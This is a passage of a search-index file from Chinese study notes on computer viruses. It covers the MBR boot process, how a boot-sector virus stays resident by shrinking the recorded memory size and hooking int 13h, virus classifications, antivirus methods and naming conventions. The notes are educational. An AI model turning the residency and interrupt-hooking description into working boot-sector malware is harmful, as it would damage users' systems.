\u4e3b\u5f15\u5bfc\u8bb0\u5f55\u7ed3\u675f\u6807\u5fd7\uff1aAA55H\uff0c\u8868\u793a\u8be5\u4e3b\u5f15\u5bfc\u8bb0\u5f55\u662f\u4e00\u4e2a\u6709\u6548\u7684\u8bb0\u5f55 dos\u7cfb\u7edf\u5f15\u5bfc\u8fc7\u7a0b\uff1a 1 BIOS\u52a0\u7535\u81ea\u68c0\uff0c\u6b64\u65f6\u7535\u6e90\u7a33\u5b9a\u540e\uff0cCPU\u4ece\u5185\u5b58\u5730\u5740FFFF\uff1a0000\u5904\u5f00\u59cb\u6267\u884c 2 \u5c06\u786c\u76d8\u7b2c\u4e00\u4e2a\u6247\u533a\u8bfb\u5165\u5185\u5b58\u5730\u57400000\uff1a7C00\u5904 3 \u68c0\u67e50000\uff1a7dfe\u662f\u5426\u7b49\u4e8e0xaa55\uff0c\u82e5\u4e0d\u7b49\u4e8e\u5219\u8df3\u53bb\u5c1d\u8bd5\u5176\u4ed6\u542f\u52a8\u4ecb\u8d28 4 \u8df3\u8f6c\u52300000\uff1a7C00\u5904\u6267\u884cMBR\u4e2d\u7684\u7a0b\u5e8f 5 MBR\u9996\u5148\u5c06\u81ea\u8eab\u91cd\u5b9a\u4f4d\u52300000\uff1a0600\u5904\u7136\u540e\u7ee7\u7eed\u6267\u884c 6 \u5728\u4e3b\u5206\u533a\u8868\u4e2d\u641c\u7d22\u6807\u5fd7\u4f4d\u6d3b\u52a8\u7684\u5206\u533a 7 \u5c06\u6d3b\u52a8\u5206\u533a\u7684\u7b2c\u4e00\u4e2a\u6247\u533a\u8bfb\u5165\u5185\u5b58\u5730\u57400000\uff1a7C00\u5904 8 \u8df3\u52300000\uff1a7C00\u5904\u7ee7\u7eed\u6267\u884c\u7279\u5b9a\u7684\u7cfb\u7edf\u542f\u52a8\u7a0b\u5e8f \u6280\u672f\u65b9\u6cd5\uff1a \u5e38\u9a7b\u5185\u5b58\u9ad8\u7aef\uff0c\u4fee\u6539\u4e2d\u65ad \u60f3\u529e\u6cd5\u628a\u75c5\u6bd2\u7a0b\u5e8f\u8f7d\u2f0a\u5230\u5185\u5b58\u4e2d\uff0c\u8f7d\u2f0a\u540e\u4fdd\u8bc1\u8fd9\u2f00\u6bb5\u4ee3\u7801\u4e0d\u88ab\u5176\u4ed6\u4ee3\u7801\u8986\u76d6\u3002 \u5185\u5b580000:0413\u5904\u4e24\u5b57\u8282\u63cf\u8ff0\u4e86\u57fa\u672c\u5185\u5b58\u7684\u5927\u5c0f\uff0c\u5b83\u7684\u503c\u662fKB\u7684\u500d\u6570\u3002 \u75c5\u6bd2\u7a0b\u5e8f\u9996\u5148\u5c06\u81ea\u8eab\u590d\u5236\u5230\u5185\u5b58\u7684\u9ad8\u7aef\uff0c\u4fee\u6539\u5185\u5b58\u5bb9\u91cf\u6807\u5fd7\u5355\u5143\uff0c\u5728\u539f\u6709\u503c\u7684\u57fa\u7840\u4e0a\u51cf\u53bb\u75c5\u6bd2\u957f\u5ea6\uff0c\u4f7f\u5f97\u75c5\u6bd2\u4ee3\u7801\u80fd\u591f\u5e38\u9a7b\u5185\u5b58\uff1b \u7136\u540e\u5c06\u539fint 13h\u78c1\u76d8\u4e2d\u65ad\u670d\u52a1\u7a0b\u5e8f\u7684\u4e2d\u65ad\u5411\u91cf\u4fdd\u5b58\uff0c\u5e76\u4fee\u6539\u6b64\u4e2d\u65ad\u5411\u91cf\uff0c\u5c06\u5176\u6307\u5411\u75c5\u6bd2\u4ee3\u7801\uff0c\u75c5\u6bd2\u4ee3\u7801\u56e0\u6b64\u83b7\u5f97\u7cfb\u7edf\u63a7\u5236\u6743\uff0c\u8fdb\u800c\u6267\u884c\u611f\u67d3\u3001\u7834\u574f\u7b49\u5de5\u4f5c\u3002 int 13 \u53c2\u6570 AH-\u8c03\u7528\u53f7\uff0802h/r 03h/w\uff09\uff1a\uff08\u5165\u53e3\u53c2\u6570\uff0c02\u4e3a\u8bfb\u6247\u533a\uff0c03\u4e3a\u5199\u6247\u533a\uff09 AL-\u8bfb/\u5199\u6247\u533a\u6570 CH-\u67f1\u9762\u53f7 CL-\u6247\u533a\u53f7 DH-\u78c1\u5934\u53f7 DL-\u9a71\u52a8\u5668\u53f7\uff0800H-7FH\uff1a\u8f6f\u76d8\uff1a80H-OFFH\uff1a\u786c\u76d8\uff09 ESBX-\u8bfb/\u5199\u7f13\u51b2\u533a\u5730\u5740\u3002\uff08\u5185\u5b58\u5730\u5740\uff09","title":"\u603b\u7ed3"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%97%85%E6%AF%92/","text":"\u75c5\u6bd2 Overview # type: folder_brief_live noteOnly: true style: strip","title":"\u75c5\u6bd2 Overview"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%97%85%E6%AF%92/#\u75c5\u6bd2-overview","text":"type: folder_brief_live noteOnly: true style: strip","title":"\u75c5\u6bd2 Overview"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC1%E7%AB%A0%20%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%97%85%E6%AF%92%E6%A6%82%E8%BF%B0/","text":"\u8ba1\u7b97\u673a\u75c5\u6bd2\u6982\u8ff0 # \u5b9a\u4e49 # \u8ba1\u7b97\u673a\u75c5\u6bd2\u662f\u8ba1\u7b97\u673a\u7a0b\u5e8f\u4e2d\u88ab\u5d4c\u5165\u7684\u4e00\u7ec4\u7834\u574f\u6027\u8ba1\u7b97\u673a\u529f\u80fd\u6216\u6bc1\u574f\u8ba1\u7b97\u673a\u6570\u636e\u7684\u8ba1\u7b97\u673a\u6307\u4ee4\u6216\u7a0b\u5e8f\u4ee3\u7801\u3002 \u75c5\u6bd2\u7279\u6027 # \u4f20\u67d3\u6027 \u9690\u853d\u6027 \u6f5c\u4f0f\u6027 \u7834\u574f\u6027 \u751f\u547d\u5468\u671f # \u6f5c\u4f0f\u9636\u6bb5 \u4f20\u67d3\u9636\u6bb5 \u89e6\u53d1\u9636\u6bb5 \u53d1\u4f5c\u9636\u6bb5\uff1a\u8868\u73b0/\u7834\u574f \u75c5\u6bd2\u5206\u7c7b\uff08\u6309\u64cd\u4f5c\u7cfb\u7edf\uff09 # DOS\u75c5\u6bd2 # \u5f15\u5bfc\u533a\u75c5\u6bd2 \u6587\u4ef6\u578b\u75c5\u6bd2 \u6df7\u5408\u578b\u75c5\u6bd2 Windows\u75c5\u6bd2 # \u811a\u672c\u75c5\u6bd2 \u5b8f\u75c5\u6bd2 PE\u75c5\u6bd2 \u7f51\u9875\u75c5\u6bd2 \u5176\u5b83\u5e73\u53f0\u75c5\u6bd2 # *NIX\u7cfb\u5217 \u624b\u673a\u75c5\u6bd2 \u75c5\u6bd2\u5206\u7c7b\uff08\u7834\u574f\u60c5\u51b5\uff09 # \u826f\u6027\u75c5\u6bd2 # \u662f\u4e0d\u5305\u542b\u5bf9\u8ba1\u7b97\u673a\u7cfb\u7edf\u4ea7\u751f\u76f4\u63a5\u7834\u574f\u4f5c\u7528\u7684\u4ee3\u7801\u7684\u8ba1\u7b97\u673a\u75c5\u6bd2\u3002 \u6076\u6027\u75c5\u6bd2 # \u6307\u5728\u4ee3\u7801\u4e2d\u5305\u542b\u6709\u7834\u574f\u8ba1\u7b97\u673a\u7cfb\u7edf\u64cd\u4f5c\u4ee3\u7801\u7684\u8ba1\u7b97\u673a\u75c5\u6bd2\u3002 \u75c5\u6bd2\u5206\u7c7b\uff08\u4f20\u64ad\u5a92\u4ecb\uff09 # \u5355\u673a\u75c5\u6bd2 # \u5355\u673a\u75c5\u6bd2\u7684\u8f7d\u4f53\u662f\u78c1\u76d8\u6216\u5149\u76d8\u3002\u5e38\u89c1\u7684\u662f\u901a\u8fc7\u4ece\u8f6f\u76d8\u4f20\u5165\u786c\u76d8\uff0c\u611f\u67d3\u7cfb\u7edf\u540e\uff0c\u518d\u4f20\u67d3\u5176\u5b83\u8f6f\u76d8\u3002\u8f6f\u76d8\u53c8\u611f\u67d3\u5176\u5b83\u7cfb\u7edf\u3002 \u7f51\u7edc\u75c5\u6bd2 # \u7f51\u7edc\u75c5\u6bd2\u5229\u7528\u8ba1\u7b97\u673a\u7f51\u7edc\u7684\u534f\u8bae\u6216\u547d\u4ee4\u4ee5\u53caEmail\u7b49\u8fdb\u884c\u4f20\u64ad\uff0c\u5e38\u89c1\u7684\u662f\u901a\u8fc7QQ\uff0cBBS\u3001Email\uff0cFTP\uff0cWeb\u7b49\u4f20\u64ad\u3002 \u75c5\u6bd2\u5206\u7c7b\uff08\u5bc4\u751f\u65b9\u5f0f\u548c\u4f20\u67d3\u9014\u5f84\uff09 # \u5f15\u5bfc\u578b\u75c5\u6bd2 \u6587\u4ef6\u578b\u75c5\u6bd2 \u5f15\u5bfc\u578b\u517c\u6587\u4ef6\u578b\u75c5\u6bd2-\u6df7\u5408\u578b\u75c5\u6bd2 \u75c5\u6bd2\u5206\u7c7b\uff08\u57fa\u672c\u5206\u7c7b\u6cd5\uff09 # \u4f20\u7edf\u75c5\u6bd2\uff1a\u6587\u4ef6\u578b\u6216\u8005\u5f15\u5bfc\u578b\u75c5\u6bd2\u5b8f\u75c5\u6bd2\uff1a\u5229\u7528Word\uff0cExcel\u7b49\u7684\u5b8f\u811a\u672c\u529f\u80fd\u8fdb\u884c\u4f20\u64ad\u7684\u75c5\u6bd2 \u6076\u610f\u811a\u672c\uff1a\u5373\u4ee5\u7834\u574f\u4e3a\u76ee\u7684\u7684\u811a\u672c\u7a0b\u5e8f\u3002 \u5305\u62ecHTML\u811a\u672c\u3001\u6279\u5904\u7406\u811a\u672c\u3001VB\u3001JS\u811a\u672c\u7b49 \u6728\u9a6c\u7a0b\u5e8f\uff1a\u7a0b\u5e8f\u88ab\u6fc0\u6d3b\u6216\u542f\u52a8\u540e\u7528\u6237\u65e0\u6cd5\u7ec8\u6b62\u5176\u8fd0\u884c\u3002 \u9ed1\u5ba2\u7a0b\u5e8f\uff1a\u5229\u7528\u7f51\u7edc\u6765\u653b\u51fb\u5176\u4ed6\u8ba1\u7b97\u673a\u7684\u7f51\u7edc\u5de5\u5177\uff0c\u88ab\u8fd0\u884c\u6216\u6fc0\u6d3b\u540e\u5c31\u50cf\u5176\u4ed6\u6b63\u5e38\u7a0b\u5e8f\u4e00\u6837\u6709\u754c\u9762\u3002 \u8815\u866b\u7a0b\u5e8f\uff1a\u8815\u866b\u75c5\u6bd2\u662f\u4e00\u79cd\u53ef\u4ee5\u5229\u7528\u64cd\u4f5c\u7cfb\u7edf\u6f0f\u6d1e\u3001\u7535\u5b50\u90ae\u4ef6\u3001P2P\u8f6f\u4ef6\u7b49\u81ea\u52a8\u4f20\u64ad\u81ea\u8eab\u7684\u75c5\u6bd2\u3002 \u53cd\u75c5\u6bd2\u6280\u672f\u4ecb\u7ecd # \u7279\u5f81\u7801\u626b\u63cf \u7f3a\u70b9\uff1a\u4e0d\u80fd\u68c0\u6d4b\u75c5\u6bd2\u53d8\u79cd\u6216\u65b0\u578b\u75c5\u6bd2\uff1b\u7279\u5f81\u5e93\u8d8a\u6765\u8d8a\u5927\u3002 \u542f\u53d1\u5f0f\u626b\u63cf \u7f3a\u70b9\uff1a\u68c0\u6d4b\u7ed3\u679c\u4e0d\u51c6\u786e\uff0c\u65e0\u6cd5\u51c6\u786e\u8fa8\u8ba4\u75c5\u6bd2\u7684\u540d\u79f0\u548c\u7c7b\u522b \u865a\u62df\u673a\u6280\u672f \u7f3a\u70b9\uff1a\u5360\u7528\u8f83\u591a\u7684\u7cfb\u7edf\u8d44\u6e90\uff0c\u5f71\u54cd\u7cfb\u7edf\u6027\u80fd\uff0c\u5f88\u96be\u51c6\u786e\u8fa8\u8ba4\u75c5\u6bd2\u7c7b\u522b\uff0c\u5f00\u53d1\u6295\u5165\u8f83\u591a \u4e3b\u52a8\u9632\u5fa1\u6280\u672f \u5b9e\u65f6\u76d1\u63a7\u7a0b\u5e8f\u7cfb\u7edf\u8c03\u7528\u6765\u786e\u5b9a\u5176\u884c\u4e3a \u81ea\u514d\u75ab\u6280\u672f \u81ea\u6821\u9a8c\u548c\u5ba1\u8ba1 \u75c5\u6bd2\u547d\u540d # \u7cfb\u7edf\u75c5\u6bd2 # Win32\u3001PE\u3001Win95\u3001W32\u3001W95 \u8815\u866b\u75c5\u6bd2 # Worm \u6728\u9a6c\u3001\u9ed1\u5ba2\u7a0b\u5e8f # Trojan \u811a\u672c\u75c5\u6bd2 # Script \u5b8f\u75c5\u6bd2 # \u524d\u7f00\uff1aMarco \u7b2c\u4e8c\u524d\u7f00\uff1aWord, Word97, Excel, Excel97 \u540e\u95e8\u7a0b\u5e8f # Backdoor \u75c5\u6bd2\u79cd\u690d\u7a0b\u5e8f # Dropper \u7834\u574f\u6027\u7a0b\u5e8f # Harm \u73a9\u7b11\u7a0b\u5e8f # Joke \u6346\u7ed1\u673a # Binder \u8ba1\u7b97\u673a\u75c5\u6bd2\u5bf9\u6297\u6280\u672f\u7684\u53d1\u5c55 # \u672a\u77e5\u75c5\u6bd2\u67e5\u6740\u6280\u672f \u9632\u75c5\u6bd2\u7acb\u4f53\u5316\u4f53\u7cfb \u6d41\u626b\u63cf\u6280\u672f \u4e91\u5b89\u5168","title":"\u8ba1\u7b97\u673a\u75c5\u6bd2\u6982\u8ff0"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC1%E7%AB%A0%20%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%97%85%E6%AF%92%E6%A6%82%E8%BF%B0/#\u8ba1\u7b97\u673a\u75c5\u6bd2\u6982\u8ff0","text":"","title":"\u8ba1\u7b97\u673a\u75c5\u6bd2\u6982\u8ff0"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC1%E7%AB%A0%20%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%97%85%E6%AF%92%E6%A6%82%E8%BF%B0/#\u5b9a\u4e49","text":"\u8ba1\u7b97\u673a\u75c5\u6bd2\u662f\u8ba1\u7b97\u673a\u7a0b\u5e8f\u4e2d\u88ab\u5d4c\u5165\u7684\u4e00\u7ec4\u7834\u574f\u6027\u8ba1\u7b97\u673a\u529f\u80fd\u6216\u6bc1\u574f\u8ba1\u7b97\u673a\u6570\u636e\u7684\u8ba1\u7b97\u673a\u6307\u4ee4\u6216\u7a0b\u5e8f\u4ee3\u7801\u3002","title":"\u5b9a\u4e49"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC1%E7%AB%A0%20%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%97%85%E6%AF%92%E6%A6%82%E8%BF%B0/#\u75c5\u6bd2\u7279\u6027","text":"\u4f20\u67d3\u6027 \u9690\u853d\u6027 \u6f5c\u4f0f\u6027 \u7834\u574f\u6027","title":"\u75c5\u6bd2\u7279\u6027"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC1%E7%AB%A0%20%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%97%85%E6%AF%92%E6%A6%82%E8%BF%B0/#\u751f\u547d\u5468\u671f","text":"\u6f5c\u4f0f\u9636\u6bb5 \u4f20\u67d3\u9636\u6bb5 \u89e6\u53d1\u9636\u6bb5 \u53d1\u4f5c\u9636\u6bb5\uff1a\u8868\u73b0/\u7834\u574f","title":"\u751f\u547d\u5468\u671f"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC1%E7%AB%A0%20%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%97%85%E6%AF%92%E6%A6%82%E8%BF%B0/#\u75c5\u6bd2\u5206\u7c7b\u6309\u64cd\u4f5c\u7cfb\u7edf","text":"","title":"\u75c5\u6bd2\u5206\u7c7b\uff08\u6309\u64cd\u4f5c\u7cfb\u7edf\uff09"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC1%E7%AB%A0%20%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%97%85%E6%AF%92%E6%A6%82%E8%BF%B0/#dos\u75c5\u6bd2","text":"\u5f15\u5bfc\u533a\u75c5\u6bd2 \u6587\u4ef6\u578b\u75c5\u6bd2 \u6df7\u5408\u578b\u75c5\u6bd2","title":"DOS\u75c5\u6bd2"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC1%E7%AB%A0%20%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%97%85%E6%AF%92%E6%A6%82%E8%BF%B0/#windows\u75c5\u6bd2","text":"\u811a\u672c\u75c5\u6bd2 \u5b8f\u75c5\u6bd2 PE\u75c5\u6bd2 \u7f51\u9875\u75c5\u6bd2","title":"Windows\u75c5\u6bd2"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC1%E7%AB%A0%20%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%97%85%E6%AF%92%E6%A6%82%E8%BF%B0/#\u5176\u5b83\u5e73\u53f0\u75c5\u6bd2","text":"*NIX\u7cfb\u5217 \u624b\u673a\u75c5\u6bd2","title":"\u5176\u5b83\u5e73\u53f0\u75c5\u6bd2"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC1%E7%AB%A0%20%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%97%85%E6%AF%92%E6%A6%82%E8%BF%B0/#\u75c5\u6bd2\u5206\u7c7b\u7834\u574f\u60c5\u51b5","text":"","title":"\u75c5\u6bd2\u5206\u7c7b\uff08\u7834\u574f\u60c5\u51b5\uff09"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC1%E7%AB%A0%20%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%97%85%E6%AF%92%E6%A6%82%E8%BF%B0/#\u826f\u6027\u75c5\u6bd2","text":"\u662f\u4e0d\u5305\u542b\u5bf9\u8ba1\u7b97\u673a\u7cfb\u7edf\u4ea7\u751f\u76f4\u63a5\u7834\u574f\u4f5c\u7528\u7684\u4ee3\u7801\u7684\u8ba1\u7b97\u673a\u75c5\u6bd2\u3002","title":"\u826f\u6027\u75c5\u6bd2"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC1%E7%AB%A0%20%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%97%85%E6%AF%92%E6%A6%82%E8%BF%B0/#\u6076\u6027\u75c5\u6bd2","text":"\u6307\u5728\u4ee3\u7801\u4e2d\u5305\u542b\u6709\u7834\u574f\u8ba1\u7b97\u673a\u7cfb\u7edf\u64cd\u4f5c\u4ee3\u7801\u7684\u8ba1\u7b97\u673a\u75c5\u6bd2\u3002","title":"\u6076\u6027\u75c5\u6bd2"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC1%E7%AB%A0%20%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%97%85%E6%AF%92%E6%A6%82%E8%BF%B0/#\u75c5\u6bd2\u5206\u7c7b\u4f20\u64ad\u5a92\u4ecb","text":"","title":"\u75c5\u6bd2\u5206\u7c7b\uff08\u4f20\u64ad\u5a92\u4ecb\uff09"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC1%E7%AB%A0%20%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%97%85%E6%AF%92%E6%A6%82%E8%BF%B0/#\u5355\u673a\u75c5\u6bd2","text":"\u5355\u673a\u75c5\u6bd2\u7684\u8f7d\u4f53\u662f\u78c1\u76d8\u6216\u5149\u76d8\u3002\u5e38\u89c1\u7684\u662f\u901a\u8fc7\u4ece\u8f6f\u76d8\u4f20\u5165\u786c\u76d8\uff0c\u611f\u67d3\u7cfb\u7edf\u540e\uff0c\u518d\u4f20\u67d3\u5176\u5b83\u8f6f\u76d8\u3002\u8f6f\u76d8\u53c8\u611f\u67d3\u5176\u5b83\u7cfb\u7edf\u3002","title":"\u5355\u673a\u75c5\u6bd2"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC1%E7%AB%A0%20%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%97%85%E6%AF%92%E6%A6%82%E8%BF%B0/#\u7f51\u7edc\u75c5\u6bd2","text":"\u7f51\u7edc\u75c5\u6bd2\u5229\u7528\u8ba1\u7b97\u673a\u7f51\u7edc\u7684\u534f\u8bae\u6216\u547d\u4ee4\u4ee5\u53caEmail\u7b49\u8fdb\u884c\u4f20\u64ad\uff0c\u5e38\u89c1\u7684\u662f\u901a\u8fc7QQ\uff0cBBS\u3001Email\uff0cFTP\uff0cWeb\u7b49\u4f20\u64ad\u3002","title":"\u7f51\u7edc\u75c5\u6bd2"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC1%E7%AB%A0%20%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%97%85%E6%AF%92%E6%A6%82%E8%BF%B0/#\u75c5\u6bd2\u5206\u7c7b\u5bc4\u751f\u65b9\u5f0f\u548c\u4f20\u67d3\u9014\u5f84","text":"\u5f15\u5bfc\u578b\u75c5\u6bd2 \u6587\u4ef6\u578b\u75c5\u6bd2 \u5f15\u5bfc\u578b\u517c\u6587\u4ef6\u578b\u75c5\u6bd2-\u6df7\u5408\u578b\u75c5\u6bd2","title":"\u75c5\u6bd2\u5206\u7c7b\uff08\u5bc4\u751f\u65b9\u5f0f\u548c\u4f20\u67d3\u9014\u5f84\uff09"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC1%E7%AB%A0%20%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%97%85%E6%AF%92%E6%A6%82%E8%BF%B0/#\u75c5\u6bd2\u5206\u7c7b\u57fa\u672c\u5206\u7c7b\u6cd5","text":"\u4f20\u7edf\u75c5\u6bd2\uff1a\u6587\u4ef6\u578b\u6216\u8005\u5f15\u5bfc\u578b\u75c5\u6bd2\u5b8f\u75c5\u6bd2\uff1a\u5229\u7528Word\uff0cExcel\u7b49\u7684\u5b8f\u811a\u672c\u529f\u80fd\u8fdb\u884c\u4f20\u64ad\u7684\u75c5\u6bd2 \u6076\u610f\u811a\u672c\uff1a\u5373\u4ee5\u7834\u574f\u4e3a\u76ee\u7684\u7684\u811a\u672c\u7a0b\u5e8f\u3002 \u5305\u62ecHTML\u811a\u672c\u3001\u6279\u5904\u7406\u811a\u672c\u3001VB\u3001JS\u811a\u672c\u7b49 \u6728\u9a6c\u7a0b\u5e8f\uff1a\u7a0b\u5e8f\u88ab\u6fc0\u6d3b\u6216\u542f\u52a8\u540e\u7528\u6237\u65e0\u6cd5\u7ec8\u6b62\u5176\u8fd0\u884c\u3002 \u9ed1\u5ba2\u7a0b\u5e8f\uff1a\u5229\u7528\u7f51\u7edc\u6765\u653b\u51fb\u5176\u4ed6\u8ba1\u7b97\u673a\u7684\u7f51\u7edc\u5de5\u5177\uff0c\u88ab\u8fd0\u884c\u6216\u6fc0\u6d3b\u540e\u5c31\u50cf\u5176\u4ed6\u6b63\u5e38\u7a0b\u5e8f\u4e00\u6837\u6709\u754c\u9762\u3002 \u8815\u866b\u7a0b\u5e8f\uff1a\u8815\u866b\u75c5\u6bd2\u662f\u4e00\u79cd\u53ef\u4ee5\u5229\u7528\u64cd\u4f5c\u7cfb\u7edf\u6f0f\u6d1e\u3001\u7535\u5b50\u90ae\u4ef6\u3001P2P\u8f6f\u4ef6\u7b49\u81ea\u52a8\u4f20\u64ad\u81ea\u8eab\u7684\u75c5\u6bd2\u3002","title":"\u75c5\u6bd2\u5206\u7c7b\uff08\u57fa\u672c\u5206\u7c7b\u6cd5\uff09"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC1%E7%AB%A0%20%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%97%85%E6%AF%92%E6%A6%82%E8%BF%B0/#\u53cd\u75c5\u6bd2\u6280\u672f\u4ecb\u7ecd","text":"\u7279\u5f81\u7801\u626b\u63cf \u7f3a\u70b9\uff1a\u4e0d\u80fd\u68c0\u6d4b\u75c5\u6bd2\u53d8\u79cd\u6216\u65b0\u578b\u75c5\u6bd2\uff1b\u7279\u5f81\u5e93\u8d8a\u6765\u8d8a\u5927\u3002 \u542f\u53d1\u5f0f\u626b\u63cf \u7f3a\u70b9\uff1a\u68c0\u6d4b\u7ed3\u679c\u4e0d\u51c6\u786e\uff0c\u65e0\u6cd5\u51c6\u786e\u8fa8\u8ba4\u75c5\u6bd2\u7684\u540d\u79f0\u548c\u7c7b\u522b \u865a\u62df\u673a\u6280\u672f \u7f3a\u70b9\uff1a\u5360\u7528\u8f83\u591a\u7684\u7cfb\u7edf\u8d44\u6e90\uff0c\u5f71\u54cd\u7cfb\u7edf\u6027\u80fd\uff0c\u5f88\u96be\u51c6\u786e\u8fa8\u8ba4\u75c5\u6bd2\u7c7b\u522b\uff0c\u5f00\u53d1\u6295\u5165\u8f83\u591a \u4e3b\u52a8\u9632\u5fa1\u6280\u672f \u5b9e\u65f6\u76d1\u63a7\u7a0b\u5e8f\u7cfb\u7edf\u8c03\u7528\u6765\u786e\u5b9a\u5176\u884c\u4e3a \u81ea\u514d\u75ab\u6280\u672f \u81ea\u6821\u9a8c\u548c\u5ba1\u8ba1","title":"\u53cd\u75c5\u6bd2\u6280\u672f\u4ecb\u7ecd"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC1%E7%AB%A0%20%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%97%85%E6%AF%92%E6%A6%82%E8%BF%B0/#\u75c5\u6bd2\u547d\u540d","text":"","title":"\u75c5\u6bd2\u547d\u540d"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC1%E7%AB%A0%20%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%97%85%E6%AF%92%E6%A6%82%E8%BF%B0/#\u7cfb\u7edf\u75c5\u6bd2","text":"Win32\u3001PE\u3001Win95\u3001W32\u3001W95","title":"\u7cfb\u7edf\u75c5\u6bd2"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC1%E7%AB%A0%20%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%97%85%E6%AF%92%E6%A6%82%E8%BF%B0/#\u8815\u866b\u75c5\u6bd2","text":"Worm","title":"\u8815\u866b\u75c5\u6bd2"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC1%E7%AB%A0%20%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%97%85%E6%AF%92%E6%A6%82%E8%BF%B0/#\u6728\u9a6c\u9ed1\u5ba2\u7a0b\u5e8f","text":"Trojan","title":"\u6728\u9a6c\u3001\u9ed1\u5ba2\u7a0b\u5e8f"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC1%E7%AB%A0%20%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%97%85%E6%AF%92%E6%A6%82%E8%BF%B0/#\u811a\u672c\u75c5\u6bd2","text":"Script","title":"\u811a\u672c\u75c5\u6bd2"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC1%E7%AB%A0%20%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%97%85%E6%AF%92%E6%A6%82%E8%BF%B0/#\u5b8f\u75c5\u6bd2","text":"\u524d\u7f00\uff1aMarco \u7b2c\u4e8c\u524d\u7f00\uff1aWord, Word97, Excel, Excel97","title":"\u5b8f\u75c5\u6bd2"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC1%E7%AB%A0%20%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%97%85%E6%AF%92%E6%A6%82%E8%BF%B0/#\u540e\u95e8\u7a0b\u5e8f","text":"Backdoor","title":"\u540e\u95e8\u7a0b\u5e8f"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC1%E7%AB%A0%20%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%97%85%E6%AF%92%E6%A6%82%E8%BF%B0/#\u75c5\u6bd2\u79cd\u690d\u7a0b\u5e8f","text":"Dropper","title":"\u75c5\u6bd2\u79cd\u690d\u7a0b\u5e8f"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC1%E7%AB%A0%20%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%97%85%E6%AF%92%E6%A6%82%E8%BF%B0/#\u7834\u574f\u6027\u7a0b\u5e8f","text":"Harm","title":"\u7834\u574f\u6027\u7a0b\u5e8f"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC1%E7%AB%A0%20%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%97%85%E6%AF%92%E6%A6%82%E8%BF%B0/#\u73a9\u7b11\u7a0b\u5e8f","text":"Joke","title":"\u73a9\u7b11\u7a0b\u5e8f"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC1%E7%AB%A0%20%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%97%85%E6%AF%92%E6%A6%82%E8%BF%B0/#\u6346\u7ed1\u673a","text":"Binder","title":"